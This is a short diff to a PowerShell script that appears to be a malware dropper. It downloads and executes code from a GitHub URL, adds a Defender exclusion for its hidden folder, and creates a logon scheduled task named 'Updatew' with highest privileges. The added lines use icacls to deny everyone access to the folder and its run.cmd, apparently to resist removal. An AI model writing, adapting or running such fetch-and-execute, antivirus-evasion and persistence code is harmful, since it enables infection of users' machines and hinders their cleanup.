@@ -2,7 +2,8 @@ iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden
 
 $dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
-
+icacls "$dir" /deny Everyone:(OI)(CI)(F)
+icacls "$temp" /deny Everyone:(OI)(CI)(F)
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
@@ -16,7 +17,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 Add-MpPreference -ExclusionPath $dir
 
-
+icacls "$temp\run.cmd" /deny Everyone:(OI)(CI)(F)
 schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$temp\run.cmd" /RL HIGHEST /F
 
 
